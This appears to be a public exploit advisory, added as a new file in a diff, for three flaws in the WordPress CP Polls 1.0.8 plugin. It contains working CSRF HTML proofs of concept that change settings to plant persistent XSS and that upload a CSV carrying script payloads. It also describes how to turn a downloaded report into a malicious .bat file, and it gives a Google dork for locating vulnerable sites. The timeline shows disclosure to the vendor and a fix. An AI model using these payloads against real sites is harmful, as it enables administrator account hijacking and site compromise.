@@ -1,0 +1,188 @@
+# Exploit Title: WordPress CP Polls 1.0.8 - CSRF - Update poll settings & Persistent XSS
+# Date: 2016-02-22
+# Google Dork: Index of /wp-content/plugins/cp-polls/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Plugin URI: http://wordpress.dwbooster.com/forms/cp-polls
+# Version: 1.0.8
+
+=============
+ Description
+=============
+
+With **CP Polls** you can publish a poll into a page/post and optionally display statistics of the results.
+You can receive email notifications every time a vote is added or opt to receive Excel reports periodically.
+
+The Polls can have dependant questions, this means that some questions are displayed depending of the
+selection made on other questions.
+
+(copy of README.txt)
+
+
+===================
+ Technical details
+===================
+
+CP Polls plugin for wordpress is vulnerable to Persistent Cross-site scripting is not sanitizing the
+values of the options before savinng to database. This issue can be exploited by an attacker with
+CSRF by sending a malicious link to a wordpress administrator. If administrator clicks the link, the
+action will be executed because there isn't CSRF protection.
+
+=========================
+ Proof of Concept (html)
+=========================
+
+<html>
+  <!-- CSRF PoC - Burp Suite i0 SecLab plugin -->
+  <!-- We can find the Poll id into the source code of a post with a cp poll and looking for ´CP_Polls_id´.
+  We can find something like: <input type="hidden" name="CP_Polls_id" value="4" />
+  4 is the Poll's id, now we have the id and we can make a csrf attack.
+   -->
+<body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:80/wordpress/wp-admin/options-general.php?page=CP_Polls&cal=1", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
+        xhr.withCredentials = true;
+        var body = "CP_Polls_post_options=1&CP_Polls_id= [ Poll id to update! ]&poll_limit=2&poll_private_reports=false&poll_see_results=true&poll_text_seeres=  [PERSISTENT CODE INJECT HERE]  &poll_text_private=s&poll_text_votes=votes&fp_return_page=&form_structure=%5B%5B%7B%22form_identifier%22%3A%22%22%2C%22name%22%3A%22fieldname1%22%2C%22shortlabel%22%3A%22%22%2C%22index%22%3A0%2C%22ftype%22%3A%22fradio%22%2C%22userhelp%22%3A%22%22%2C%22userhelpTooltip%22%3Afalse%2C%22csslayout%22%3A%22%22%2C%22title%22%3A%22Select+a+Choice%22%2C%22layout%22%3A%22one_column%22%2C%22required%22%3Atrue%2C%22choiceSelected%22%3A%22%22%2C%22showDep%22%3Afalse%2C%22choices%22%3A%5B%22First+Choice%22%2C%22Second+Choice%22%2C%22Third+Choice%22%5D%2C%22choicesVal%22%3A%5B%22First+Choice%22%2C%22Second+Choice%22%2C%22Third+Choice%22%5D%2C%22choicesDep%22%3A%5B%5B%5D%2C%5B%5D%2C%5B%5D%5D%2C%22fBuild%22%3A%7B%7D%7D%5D%2C%5B%7B%22title%22%3A%22  [PERSISTENT CODE INJECT HERE]  %22%2C%22description%22%3A%22 [PERSISTENT CODE INJECT HERE]  %22%2C%22formlayout%22%3A%22top_aligned%22%2C%22formtemplate%22%3A%22%22%7D%5D%5D&vs_text_submitbtn=  [PERSISTENT CODE INJECT HERE]  &vs_text_previousbtn=Previous&vs_text_nextbtn=Next&vs_use_validation=true&vs_text_is_required=This+field+is+required.&cv_text_enter_valid_captcha=  [PERSISTENT CODE INJECT HERE]  .&vs_text_is_email=Please+enter+a+valid+email+address.&vs_text_datemmddyyyy=Please+enter+a+valid+date+with+this+format%28mm%2Fdd%2Fyyyy%29&vs_text_dateddmmyyyy=Please+enter+a+valid+date+with+this+format%28dd%2Fmm%2Fyyyy%29&vs_text_number=Please+enter+a+valid+number.&vs_text_digits=Please+enter+only+digits.&vs_text_max=Please+enter+a+value+less+than+or+equal+to+%7B0%7D.&vs_text_min=Please+enter+a+value+greater+than+or+equal+to+%7B0%7D.&fp_emailfrommethod=fixed&fp_from_email=admin%40localhost.com&fp_destination_emails=admin%40localhost.com&fp_subject=Contact+from+the+blog...&fp_inc_additional_info=true&fp_emailformat=text&fp_message=The+following+contact+message+has+been+sent%3A%0D%0A%0D%0A%3C%25INFO%25%3E%0D%0A%0D%0A&cu_enable_copy_to_user=false&cu_subject=Confirmation%3A+Message+received...&cu_emailformat=text&cu_message=Thank+you+for+your+message.+We+will+reply+you+as+soon+as+possible.%0D%0A%0D%0AThis+is+a+copy+of+the+data+sent%3A%0D%0A%0D%0A%3C%25INFO%25%3E%0D%0A%0D%0ABest+Regards.&cv_enable_captcha=false&cv_width=170&cv_height=60&cv_chars=5&cv_min_font_size=25&cv_max_font_size=35&cv_noise=200&cv_noise_length=4&cv_background=ffffff&cv_border=000000&cv_font=font-1.ttf&rep_enable=no&rep_days=1&rep_hour=0&rep_emails=&rep_subject=as&rep_emailformat=text&rep_message=Attached+you+will+find+the+data+from+the+form+submissions.&submit=Save+Changes";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+################################################################################
+
+
+# Exploit Title: WordPress CP Polls 1.0.8 - Reflected file download (.bat file)
+# Date: 2016-02-22
+# Google Dork: Index of /wp-content/plugins/cp-polls/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Plugin URI: http://wordpress.dwbooster.com/forms/cp-polls
+# Version: 1.0.8
+# Demo: https://www.youtube.com/watch?v=uc6P59BPEkU
+
+===================
+ Technical details
+===================
+
+CP Polls plugin for wordpress is prone to file download issue. A hacker is able to attack an administrator by
+exploiting a CSRF in the 'change cp poll name' converting the downloadable report file (csv) to a malicious .bat file.
+Because there is not restriction in the cp poll name the CSRF exploit can change the name to ...
+
+malicious.bat;
+
+The semicolon (;) character must be restricted because the header 'Content-Disposition' uses this characteer as a
+parameter delimitation. For example, when we change the name of a cp poll to 'malicious.bat;' when an administrator
+download the report (thinking that is a csv file) the response header turns:
+""
+Content-Disposition: attachment; file=malicious.bat;.csv
+""
+the csv is ignored and the administrator gets a .BAT file
+
+
+So, how to exploit this vulnerability to execute commands on the victim's machine?
+Whe have an option. If the cp_poll is added in a post we can vote them and we can inject our malicious payload
+into a votation.
+
+==============================
+ Proof of Concept CSRF (html)
+==============================
+
+https://www.youtube.com/watch?v=uc6P59BPEkU
+
+==========================
+
+If the csrf attack is succesful, we only need to inject our commands in votations. In ´fieldnames´ post parameter
+ we can inject our commands.
+
+
+################################################################################
+
+
+# Exploit Title: WordPress CP Polls 1.0.8 - Cross-site file upload & persistent XSS
+# Date: 2016-02-22
+# Google Dork: Index of /wp-content/plugins/cp-polls/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Plugin URI: http://wordpress.dwbooster.com/forms/cp-polls
+# Version: 1.0.8
+
+===================
+ Technical details
+===================
+
+CP Polls plugin for wordpress is prone to persistent XSS via cross-site file upload.
+When we register an cp_poll, it is sanitized correctly but when we upload a CSV file, we can
+bypass the protection and inject malicious HTML/Javascript.
+
+There are not CSRF protection in that action so it can be exploited with a CSRF attack by sending a
+malicious link to a victim (administrator) a wait for execution of the malicious request.
+
+=========================
+ Proof of Concept (html)
+=========================
+
+<html>
+<body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://<wp.host>/wp-admin/admin.php?page=CP_Polls&cal=1&list=1&import=1", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------17460754011784");
+        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
+        xhr.withCredentials = true;
+        var body = "-----------------------------17460754011784\r\n" +
+          "Content-Disposition: form-data; name=\"importfile\"; filename=\"csv.csv\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "2013-04-21 18:50:00, 192.168.1.12, <img src=x onerror=alert('You_are_owned!')>,
+           \"<img src=x onerror=alert('I am scared!')>\", \"sample subject\", \"\"\r\n" +
+          "-----------------------------17460754011784\r\n" +
+          "Content-Disposition: form-data; name=\"pbuttonimport\"\r\n" +
+          "\r\n" +
+          "Import\r\n" +
+          "-----------------------------17460754011784--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+==========
+ CREDITS
+==========
+
+Vulnerability discovered by:
+	Joaquin Ramirez Martinez [i0 security-lab]
+	joaquin.ramirez.mtz.lab[at]gmail[dot]com
+	https://www.facebook.com/I0-security-lab-524954460988147/
+	https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q
+
+
+========
+TIMELINE
+========
+
+2016-02-10 vulnerability discovered
+2016-02-22 reported to vendor
+2016-03-01 released cp polls v1.0.9
+2016-03-01 public disclousure
